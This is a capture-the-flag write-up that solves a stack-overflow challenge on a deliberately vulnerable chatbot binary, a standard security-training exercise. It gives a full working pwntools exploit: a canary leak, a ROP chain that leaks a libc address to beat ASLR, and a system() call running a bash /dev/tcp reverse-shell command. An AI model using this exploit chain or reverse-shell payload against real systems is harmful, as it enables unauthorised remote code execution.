# Exploitation - Hard 1 - NotSoSmart Chatbot

## Description

This is an "AI" chatbot that doesn't seem to know too much  

Interact with it on `tcp/8677`  

Your goal is to gain RCE to be able to find and read a flag.txt on the target system  

No brute force is required - it won't work either  

ASLR is enabled on the target system  


## Solution

<details>
<summary>Show Guide</summary>

First, enumerate the chatbot locally by interacting with it:  
```sh
./NotSoSmartChatbot 127.0.0.1
nc 127.0.0.1 8677
# Very unusual, it tells us our Connfd when we connect:
# Connected. Connfd = 0x00000004

# Can it handle multiple connections at once? 
nc 127.0.0.1 8677
# yes

# is it forking new processes on each new connection?
ps -aux | grep NotSoSmartChatbot
# yes

# What happens if I send 1000 a's to the input option and then quit (return)?
nc 127.0.0.1 8677
> 1
> aaaaaaaaaaaaaaaaaaaaa.....
> 3
# *** stack smashing detected ***: terminated 
# Nice
```

Run checksec on the binary:  
```
checksec NotSoSmartChatbot
[*] '/home/purple/NotSoSmartChatbot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Canary, NX, and ASLR.  

Lets look at it in Ghidra:  

Option 1 will read up to 1280 bytes into a 128 byte buffer on the stack:  
```C
read(param_1,&local_98,1280);
```
Option 2 will write from that buffer until it encounters a null byte:
```C
sVar3 = strlen((char *)&local_98);
sVar4 = write(param_1,&local_98,sVar3);
```

### **Leaking a Canary**

In Linux, the least significant byte of a stack canary will always be `\x00`  
Knowing this, we should be able to overflow out of the buffer, all the way up to and including the null byte at the start of the canary.  
If we overwrite that null byte, when option 2 calls `strlen`/`write` it should keep writing until it reaches the next null byte. Therefore, the next 7 bytes after our payload string will be the 7 bytes of the canary, not including the null byte that we overwrote.  

How many bytes do we need to send before we get to the LSB of the canary?  
It is easy to answer this question with gdb and `cyclic` from pwntools 

```sh
# (Terminal Window 1)
# start chatbot with gdb: 
gdb NotSoSmartChatbot
gef> start 127.0.0.1
# We want to follow the child of the fork, not the parent:
gef> set follow-fork-mode child
# Add a breakpoint to the address where the canary comparison happens (get it from Ghidra: 00401841 XOR RAX,qword ptr FS:[0x28])
gef> b *(0x401841)
gef> c

# (Terminal Window 2)
# Generate cyclic string:
cyclic 300
nc 127.0.0.1 8677
> 1
> Paste cyclic string
> 3

# (Terminal Window 1)
# Should have hit our breakpoint
# Whats in rax? $rax: 0x6261616b6261616a ("jaabkaab"?)

# (Terminal Window 2)
# Search the cyclic string for jaab
cyclic -l jaab
# 136
```

This means the canary starts after the 136th byte of our payload  

We can leak it like so:  
```py
import struct, pwn, time

SLEEP_TIME = .1

TARGET_HOST = '127.0.0.1'
TARGET_PORT = 8677

target = pwn.remote(TARGET_HOST, TARGET_PORT)

payload = b'a' * 136 # fill up space up to the canary \n will overwrite lsb

target.sendline(b'1')
time.sleep(SLEEP_TIME)
target.recvuntil(b'talk about? \n')
target.sendline(payload)
time.sleep(SLEEP_TIME)
target.sendline(b'2')
time.sleep(SLEEP_TIME)
target.recvuntil(b'a' * 136 + b'\n')
canary = target.recv(7)

canary = b'\0' + canary

print(f"Canary is: {hex(struct.unpack('<Q', canary)[0])}")
```
Note: I always sleep for a sleep time when interacting with sockets. Helps with some bugs

### **Defeating ASLR**

We need to leak an address in libc to defeat ASLR  

One way to do this is to use write() to leak the GOT entry for write()  

write takes three parameters: 
1. file descriptor (rdi)
2. buffer to write (rsi)
3. number of bytes to write (rdx)

Luckily the chatbot handed our connection fd to us when we connected  

We need to find ROP gadgets to be able to control all three of those parameters:  
```sh
ropper --file NotSoSmartChatbot --search "pop rdi"
# 0x0000000000401b13: pop rdi; ret; 
ropper --file NotSoSmartChatbot --search "pop rsi"
# 0x0000000000401b11: pop rsi; pop r15; ret;
ropper --file NotSoSmartChatbot --search "pop rdx"
# Nothing... uh oh
ropper --file NotSoSmartChatbot --search "% ?dx"
# 0x000000000040140c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x1390; mov byte ptr [rip + 0x2cd3], 1; pop rbp; ret;

# :( Thats not gonna work...
```
So, we don't have a good gadget for controlling rdx. This would be a problem, except: look at what happens before we ret when we choose option 3:
```C
write(param_1,"Goodbye!\n",9);
```

Because of that, 9 should already be in rdx. And we are trying to leak an 8 byte address. So, we should be ok without needing to control rdx actually  

With these gadgets, here is how we can construct a payload to leak the got entry for write:
```py
target_elf = pwn.ELF('NotSoSmartChatbot')

target.recvuntil(b'Connfd = ')
connfd = int(target.recv(10), 16)

pop_rsi = struct.pack("<Q", 0x401b11)
pop_rdi = struct.pack("<Q", 0x401b13)
ret_padding = struct.pack("<Q", 0x401b14) # calls must be made from a 16-byte aligned boundry. This compensates for that  

write_plt = target_elf.symbols['write']
write_got = target_elf.got['write']

leak_libc_payload = b'a' * 136
leak_libc_payload += canary
leak_libc_payload += b'a' * 8 # There are 8 extra bytes after the canary (rbp storage)
leak_libc_payload += pop_rsi
leak_libc_payload += struct.pack("<Q", write_got) # put write got in rsi
leak_libc_payload += struct.pack("<Q", 0x0) # This will be popped into r15 because of the nature of our pop_rsi gadget
leak_libc_payload += pop_rdi
leak_libc_payload += struct.pack("<Q", connfd)
leak_libc_payload += struct.pack("<Q", write_plt)
leak_libc_payload += ret_padding

target.sendline(b'1')
time.sleep(SLEEP_TIME)
target.recvuntil(b'talk about? \n')
target.sendline(leak_libc_payload)
time.sleep(SLEEP_TIME)

target.sendline(b'3')
time.sleep(SLEEP_TIME)
target.recvuntil(b'Goodbye!\n')
leak = target.recv(8)

leaked_write_addr = struct.unpack("<Q", leak)[0]
print(f"leaked write address in libc: {hex(leaked_write_addr)}")
```

Now that we have that, it is simple to find the base address of libc:
```py
libc_elf = pwn.ELF('libc-2.31.so')

libc_write_offset = libc_elf.symbols['write']

libc_base_addr = leaked_write_addr - libc_write_offset
print(f"libc base address: {hex(libc_base_addr)}")
```

Note: the libc base address should always end in 000. If it does not, you are off  

Now that we have the base address of libc, we can use ROP gadgets and call functions in libc.  

We can use this to build a rop chain which will build a reverse shell string in writeable memory and execute that reverse shell with system:
```Python
###########################
#### Gadgets from libc ####
###########################

# 0x0000000000033d17: mov qword ptr [rax], rdx; ret;
# 0x0000000000036174: pop rax; ret
# 0x0000000000142c92: pop rdx; ret;

pop_rax = struct.pack("<Q", libc_base_addr + 0x36174)
pop_rdx = struct.pack("<Q", libc_base_addr + 0x142c92)
mov_rax = struct.pack("<Q", libc_base_addr + 0x33d17)

# Find writeable memory with vmmap or /proc/pid/maps
# 00404000-00405000 rw-p 00003000 103:02 12064133 /home/purple/NotSoSmartChatbot/NotSoSmartChatbot
writeable_mem = 0x404000

# we are going to need these two:
system_offset = libc_elf.symbols['system']
exit_offset = libc_elf.symbols['exit']

system_addr = struct.pack("<Q", libc_base_addr + system_offset)
exit_addr = struct.pack("<Q", libc_base_addr + exit_offset)


##############################
#### Assemble the Payload ####
##############################

REV_SHELL_ADDR = b'127.0.0.1'
REV_SHELL_PORT = b'8888'

command = b"bash -c 'bash -i >& /dev/tcp/" + REV_SHELL_ADDR + b"/" + REV_SHELL_PORT + b" 0>&1'"

final_payload = b'a' * 136
final_payload += canary
final_payload += b'a' * 8 # There were 8 extra bytes after the canary (rbp storage)

# Write string to writeable memory
for i in range(0, len(command), 8):
    final_payload += pop_rax
    final_payload += struct.pack("<Q", writeable_mem + i) # put writable memory address in rax
    final_payload += pop_rdx
    final_payload += command[i:i+8].ljust(8, b'\x00') # put next 8 bytes of payload into rdx
    final_payload += mov_rax

final_payload += pop_rdi
final_payload += struct.pack("<Q", writeable_mem) # Put the address of our command string in rdi

# realign if we need to:
if len(final_payload) % 16 != 0:
    final_payload += ret_padding

final_payload += system_addr
final_payload += exit_addr

##########################
#### Send the payload ####
##########################

target.close()

target = pwn.remote(TARGET_HOST, TARGET_PORT) # Need to reconnect

target.sendline(b'1')
time.sleep(SLEEP_TIME)
target.recvuntil(b'talk about? \n')
target.sendline(final_payload)
time.sleep(SLEEP_TIME)

target.sendline(b'3')
```
</details>


<details>
<summary>Show Solution</summary>

Here is the full exploit, all put together:

```Python
import struct, pwn, time

SLEEP_TIME = .1

TARGET_HOST = '127.0.0.1'
TARGET_PORT = 8677

REV_SHELL_ADDR = b'127.0.0.1'
REV_SHELL_PORT = b'8888'

libc_elf = pwn.ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
target_elf = pwn.ELF('NotSoSmartChatbot')

target = pwn.remote(TARGET_HOST, TARGET_PORT)

#### What is the Conn FD? ####

target.recvuntil(b'Connfd = ')
connfd = int(target.recv(10), 16)

############################
#### Leaking the Canary ####
############################

payload = b'a' * 136 # fill up space up to the canary \n will overwrite lsb

target.sendline(b'1')
time.sleep(SLEEP_TIME)
target.recvuntil(b'talk about? \n')
target.sendline(payload)
time.sleep(SLEEP_TIME)
target.sendline(b'2')
time.sleep(SLEEP_TIME)
target.recvuntil(b'a' * 136 + b'\n')
canary = target.recv(7)

canary = b'\0' + canary

print(f"Canary is: {hex(struct.unpack('<Q', canary)[0])}")

##############################
#### Gadgets we will need ####
##############################

# write() takes three parameters:
	# 1) file descriptor (rdi)
	# 2) buffer to write (rsi)
	# 3) number of bytes to write (rdx)

# pop rsi:
# 0x0000000000401b11: pop rsi; pop r15; ret;
pop_rsi = struct.pack("<Q", 0x401b11)

# pop rdi:
pop_rdi = struct.pack("<Q", 0x401b13)

# pop rdx:
# There are no great rdx gadgets: Will rely on the value in rdx being more than 8 (which should be the case)

# ret padding:
ret_padding = struct.pack("<Q", 0x401b14)

##############################################
#### Leaking the address of write in libc ####
##############################################

write_plt = target_elf.symbols['write']
write_got = target_elf.got['write']

leak_libc_payload = b'a' * 136
leak_libc_payload += canary
leak_libc_payload += b'a' * 8 # There were 8 extra bytes after the canary (rbp storage)
leak_libc_payload += pop_rsi
leak_libc_payload += struct.pack("<Q", write_got)
leak_libc_payload += struct.pack("<Q", 0x0) # This will be popped into r15 because of the nature of our pop_rsi gadget
leak_libc_payload += pop_rdi
leak_libc_payload += struct.pack("<Q", connfd)
leak_libc_payload += struct.pack("<Q", write_plt)
leak_libc_payload += ret_padding

target.sendline(b'1')
time.sleep(SLEEP_TIME)
target.recvuntil(b'talk about? \n')
target.sendline(leak_libc_payload)
time.sleep(SLEEP_TIME)

target.sendline(b'3')
time.sleep(SLEEP_TIME)
target.recvuntil(b'Goodbye!\n')
leak = target.recv(8)

leaked_write_addr = struct.unpack("<Q", leak)[0]
print(f"leaked write address in libc: {hex(leaked_write_addr)}")

####################################
#### Calculating libc base addr ####
####################################

libc_write_offset = libc_elf.symbols['write']

libc_base_addr = leaked_write_addr - libc_write_offset
print(f"libc base address: {hex(libc_base_addr)}")

###########################
#### Gadgets from libc ####
###########################

# 0x0000000000033d17: mov qword ptr [rax], rdx; ret;
# 0x0000000000036174: pop rax; ret
# 0x0000000000142c92: pop rdx; ret;

pop_rax = struct.pack("<Q", libc_base_addr + 0x36174)
pop_rdx = struct.pack("<Q", libc_base_addr + 0x142c92)
mov_rax = struct.pack("<Q", libc_base_addr + 0x33d17)

# Find writeable memory with vmmap or /proc/pid/maps
# 00404000-00405000 rw-p 00003000 103:02 12064133 /home/purple/NotSoSmartChatbot/NotSoSmartChatbot
writeable_mem = 0x404000

# we are going to need these two:
system_offset = libc_elf.symbols['system']
exit_offset = libc_elf.symbols['exit']

system_addr = struct.pack("<Q", libc_base_addr + system_offset)
exit_addr = struct.pack("<Q", libc_base_addr + exit_offset)

##############################
#### Assemble the Payload ####
##############################

command = b"bash -c 'bash -i >& /dev/tcp/" + REV_SHELL_ADDR + b"/" + REV_SHELL_PORT + b" 0>&1'"

final_payload = b'a' * 136
final_payload += canary
final_payload += b'a' * 8 # There were 8 extra bytes after the canary (rbp storage)

# Write string to writeable memory
for i in range(0, len(command), 8):
    final_payload += pop_rax
    final_payload += struct.pack("<Q", writeable_mem + i) # put writable memory address in rax
    final_payload += pop_rdx
    final_payload += command[i:i+8].ljust(8, b'\x00') # put next 8 bytes of payload into rdx
    final_payload += mov_rax

final_payload += pop_rdi
final_payload += struct.pack("<Q", writeable_mem) # Put the address of our command string in rdi

# realign if we need to:
if len(final_payload) % 16 != 0:
    final_payload += ret_padding

final_payload += system_addr
final_payload += exit_addr

##########################
#### Send the payload ####
##########################

target.close()

target = pwn.remote(TARGET_HOST, TARGET_PORT) # Need to reconnect

target.sendline(b'1')
time.sleep(SLEEP_TIME)
target.recvuntil(b'talk about? \n')
target.sendline(final_payload)
time.sleep(SLEEP_TIME)

target.sendline(b'3')
```
</details>